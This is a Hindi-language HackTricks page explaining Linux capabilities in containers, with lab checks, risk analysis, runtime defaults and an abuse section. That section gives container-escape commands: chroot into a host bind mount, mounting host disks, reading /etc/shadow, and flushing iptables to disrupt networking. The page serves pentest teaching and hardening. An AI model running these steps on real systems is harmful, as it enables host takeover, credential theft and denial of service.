# Containers में Linux Capabilities

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

Linux capabilities container security के सबसे महत्वपूर्ण हिस्सों में से एक हैं, क्योंकि वे एक सूक्ष्म लेकिन मूलभूत प्रश्न का उत्तर देती हैं: **किसी container के अंदर "root" का वास्तव में क्या अर्थ है?** सामान्य Linux system पर UID 0 का अर्थ ऐतिहासिक रूप से बहुत व्यापक privilege set होता था। आधुनिक kernels में इस privilege को capabilities नामक छोटी units में विभाजित किया गया है। कोई process root के रूप में चल सकता है और फिर भी कई शक्तिशाली operations से वंचित रह सकता है, यदि संबंधित capabilities हटा दी गई हों।

Containers इस अंतर पर बहुत अधिक निर्भर करते हैं। Compatibility या simplicity के कारण कई workloads को अभी भी container के अंदर UID 0 के रूप में launch किया जाता है। Capability dropping के बिना यह अत्यंत खतरनाक होता। Capability dropping के साथ, containerized root process कई सामान्य in-container tasks कर सकता है, जबकि अधिक sensitive kernel operations से वंचित रहता है। यही कारण है कि `uid=0(root)` दिखाने वाला container shell अपने-आप "host root" या "broad kernel privilege" का अर्थ नहीं रखता। Capability sets तय करते हैं कि वह root identity वास्तव में कितनी प्रभावशाली है।

Full Linux capability reference और कई abuse examples के लिए देखें:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Operation

Capabilities को कई sets में track किया जाता है, जिनमें permitted, effective, inheritable, ambient और bounding sets शामिल हैं। कई container assessments के लिए, प्रत्येक set की exact kernel semantics से अधिक तुरंत महत्वपूर्ण व्यावहारिक प्रश्न यह है: **यह process अभी कौन-से privileged operations सफलतापूर्वक कर सकता है, और future privilege gains की कौन-सी संभावनाएँ अभी भी मौजूद हैं?**

यह इसलिए महत्वपूर्ण है क्योंकि कई breakout techniques वास्तव में container problems के रूप में छिपी हुई capability problems होती हैं। `CAP_SYS_ADMIN` वाला workload kernel functionality की बहुत बड़ी मात्रा तक पहुँच सकता है, जिसे किसी सामान्य container root process को access नहीं करना चाहिए। `CAP_NET_ADMIN` वाला workload तब और अधिक खतरनाक हो जाता है, जब वह host network namespace भी share करता हो। `CAP_SYS_PTRACE` वाला workload तब अधिक महत्वपूर्ण बन जाता है, जब वह host PID sharing के माध्यम से host processes देख सके। Docker या Podman में यह `--pid=host` के रूप में दिखाई दे सकता है; Kubernetes में यह आमतौर पर `hostPID: true` के रूप में दिखाई देता है।

दूसरे शब्दों में, capability set का मूल्यांकन isolation में नहीं किया जा सकता। इसे namespaces, seccomp और MAC policy के साथ मिलाकर पढ़ना आवश्यक है।

## Lab

किसी container के अंदर capabilities inspect करने का एक बहुत सीधा तरीका है:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
आप एक अधिक restrictive container की तुलना उस container से भी कर सकते हैं जिसमें सभी capabilities जोड़ी गई हों:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
किसी सीमित addition का प्रभाव देखने के लिए, सब कुछ हटाकर केवल एक capability वापस जोड़ने का प्रयास करें:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
ये छोटे experiments यह दिखाने में मदद करते हैं कि कोई runtime केवल "privileged" नामक boolean को toggle नहीं कर रहा है। वह process के लिए उपलब्ध वास्तविक privilege surface को आकार दे रहा है।

## High-Risk Capabilities

हालांकि target के आधार पर कई capabilities महत्वपूर्ण हो सकती हैं, container escape analysis में कुछ capabilities बार-बार प्रासंगिक होती हैं।

**`CAP_SYS_ADMIN`** वह capability है जिसके प्रति defenders को सबसे अधिक संदेह रखना चाहिए। इसे अक्सर "the new root" कहा जाता है, क्योंकि यह mount-related operations, namespace-sensitive behavior और कई ऐसे kernel paths सहित बहुत बड़ी मात्रा में functionality unlock करती है, जिन्हें containers के सामने कभी भी लापरवाही से expose नहीं किया जाना चाहिए। यदि किसी container के पास `CAP_SYS_ADMIN`, weak seccomp और strong MAC confinement का अभाव है, तो कई classic breakout paths काफी अधिक वास्तविक हो जाते हैं।

**`CAP_SYS_PTRACE`** तब महत्वपूर्ण होती है जब process visibility मौजूद हो, विशेष रूप से तब जब PID namespace host या आसपास के महत्वपूर्ण workloads के साथ shared हो। यह visibility को tampering में बदल सकती है।

**`CAP_NET_ADMIN`** और **`CAP_NET_RAW`** network-focused environments में महत्वपूर्ण होती हैं। Isolated bridge network पर ये पहले से ही risky हो सकती हैं; shared host network namespace पर स्थिति और भी खराब होती है, क्योंकि workload host networking को reconfigure, sniff, spoof या local traffic flows में interfere करने में सक्षम हो सकता है।

**`CAP_SYS_MODULE`** rootful environment में आमतौर पर catastrophic होती है, क्योंकि kernel modules load करना प्रभावी रूप से host-kernel control के समान है। यह general-purpose container workload में लगभग कभी भी मौजूद नहीं होनी चाहिए।

## Runtime Usage

Docker, Podman, containerd-based stacks और CRI-O सभी capability controls का उपयोग करते हैं, लेकिन इनके defaults और management interfaces अलग-अलग होते हैं। Docker इन्हें `--cap-drop` और `--cap-add` जैसे flags के माध्यम से सीधे expose करता है। Podman समान controls expose करता है और अतिरिक्त safety layer के रूप में rootless execution से अक्सर लाभ मिलता है। Kubernetes Pod या container `securityContext` के माध्यम से capability additions और drops को surface करता है। LXC/Incus जैसे System-container environments भी capability control पर निर्भर करते हैं, लेकिन इन systems का व्यापक host integration अक्सर operators को app-container environment की तुलना में defaults को अधिक आक्रामक रूप से relax करने के लिए प्रेरित करता है।

इन सभी में यही principle लागू होता है: किसी capability को technically grant किया जा सकता है, इसका अर्थ यह नहीं है कि उसे grant किया जाना चाहिए। कई real-world incidents तब शुरू होते हैं जब कोई operator केवल इसलिए capability जोड़ देता है क्योंकि workload stricter configuration में fail हो गया था और team को quick fix चाहिए था।

## Misconfigurations

सबसे स्पष्ट गलती Docker/Podman-style CLIs में **`--cap-add=ALL`** है, लेकिन यह अकेली गलती नहीं है। व्यवहार में अधिक सामान्य समस्या एक या दो अत्यंत powerful capabilities, विशेष रूप से `CAP_SYS_ADMIN`, को "make the application work" के लिए grant करना है, बिना namespace, seccomp और mount implications को समझे। एक अन्य सामान्य failure mode extra capabilities को host namespace sharing के साथ combine करना है। Docker या Podman में यह `--pid=host`, `--network=host` या `--userns=host` के रूप में दिखाई दे सकता है; Kubernetes में equivalent exposure आमतौर पर `hostPID: true` या `hostNetwork: true` जैसी workload settings के माध्यम से दिखाई देता है। इनमें से प्रत्येक combination यह बदलता है कि capability वास्तव में किसे affect कर सकती है।

Administrators का यह मानना भी सामान्य है कि क्योंकि कोई workload पूरी तरह `--privileged` नहीं है, इसलिए वह अभी भी meaningful रूप से constrained है। कभी-कभी यह सही होता है, लेकिन कभी-कभी effective posture पहले ही privileged के इतना करीब होता है कि operational रूप से यह distinction महत्वहीन हो जाती है।

## Abuse

पहला practical step effective capability set को enumerate करना और तुरंत उन capability-specific actions को test करना है जो escape या host information access के लिए महत्वपूर्ण हो सकते हैं:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
यदि `CAP_SYS_ADMIN` मौजूद है, तो पहले mount-आधारित दुरुपयोग और host filesystem access का परीक्षण करें, क्योंकि यह breakout को सक्षम करने वाले सबसे सामान्य साधनों में से एक है:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
यदि `CAP_SYS_PTRACE` मौजूद है और container महत्वपूर्ण processes देख सकता है, तो जाँचें कि क्या इस capability को process inspection में बदला जा सकता है:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
यदि `CAP_NET_ADMIN` या `CAP_NET_RAW` मौजूद है, तो जाँचें कि क्या workload दृश्यमान network stack में हेरफेर कर सकता है या कम से कम उपयोगी network intelligence एकत्र कर सकता है:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
जब कोई capability test सफल हो जाए, तो उसे namespace की स्थिति के साथ मिलाकर देखें। Isolated namespace में केवल जोखिमपूर्ण दिखने वाली capability तुरंत escape या host-recon primitive बन सकती है, जब container host PID, host network या host mounts भी share करता हो।

### पूर्ण उदाहरण: `CAP_SYS_ADMIN` + Host Mount = Host Escape

यदि container के पास `CAP_SYS_ADMIN` और host filesystem का writable bind mount, जैसे `/host`, हो, तो escape path अक्सर सीधा होता है:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
यदि `chroot` सफल होता है, तो commands अब host root filesystem context में execute होते हैं:
```bash
id
hostname
cat /etc/shadow | head
```
यदि `chroot` उपलब्ध नहीं है, तो mounted tree के माध्यम से binary को call करके अक्सर वही परिणाम प्राप्त किया जा सकता है:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### पूर्ण उदाहरण: `CAP_SYS_ADMIN` + Device Access

यदि host का कोई block device expose किया गया है, तो `CAP_SYS_ADMIN` इसे host filesystem तक direct access में बदल सकता है:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### पूर्ण उदाहरण: `CAP_NET_ADMIN` + Host Networking

यह combination हमेशा सीधे host root प्राप्त नहीं करता, लेकिन यह host network stack को पूरी तरह reconfigure कर सकता है:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
यह denial of service, traffic interception, या उन services तक access सक्षम कर सकता है जिन्हें पहले filtered किया गया था।

## जांच

capability checks का लक्ष्य केवल raw values को dump करना नहीं है, बल्कि यह समझना भी है कि क्या process के पास अपनी वर्तमान namespace और mount स्थिति को खतरनाक बनाने के लिए पर्याप्त privilege है।
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
यहाँ क्या महत्वपूर्ण है:

- `capsh --print` `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` या `cap_sys_module` जैसी high-risk capabilities को पहचानने का सबसे आसान तरीका है।
- `/proc/self/status` में `CapEff` line बताती है कि अभी वास्तव में क्या effective है, न कि केवल यह कि अन्य sets में क्या उपलब्ध हो सकता है।
- यदि container host PID, network या user namespaces भी share करता है, या उसमें writable host mounts हैं, तो capability dump का महत्व और बढ़ जाता है।

Raw capability information एकत्र करने के बाद अगला step interpretation है। जाँचें कि process root है या नहीं, user namespaces active हैं या नहीं, host namespaces share किए गए हैं या नहीं, seccomp enforcing है या नहीं, और क्या AppArmor या SELinux अभी भी process को restrict कर रहे हैं। Capability set अपने-आप में पूरी कहानी का केवल एक हिस्सा है, लेकिन अक्सर यही वह हिस्सा होता है जो समझाता है कि एक container breakout क्यों काम करता है और उसी apparent starting point के साथ दूसरा क्यों fail हो जाता है।

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Reduced capability set by default | Docker capabilities की एक default allowlist रखता है और बाकी को drop कर देता है | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Reduced capability set by default | Podman containers default रूप से unprivileged होते हैं और reduced capability model का उपयोग करते हैं | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Inherits runtime defaults unless changed | यदि `securityContext.capabilities` specify नहीं किए गए हैं, तो container को runtime से default capability set मिलता है | `securityContext.capabilities.add`, `drop: [\"ALL\"]` करने में विफलता, `privileged: true` |
| containerd / CRI-O under Kubernetes | Usually runtime default | Effective set runtime और Pod spec पर निर्भर करता है | Kubernetes row के समान; direct OCI/CRI configuration भी capabilities को explicitly add कर सकती है |

Kubernetes के लिए महत्वपूर्ण बात यह है कि API एक universal default capability set define नहीं करता। यदि Pod capabilities को add या drop नहीं करता है, तो workload उस node के runtime default को inherit करता है।
{{#include ../../../../banners/hacktricks-training.md}}
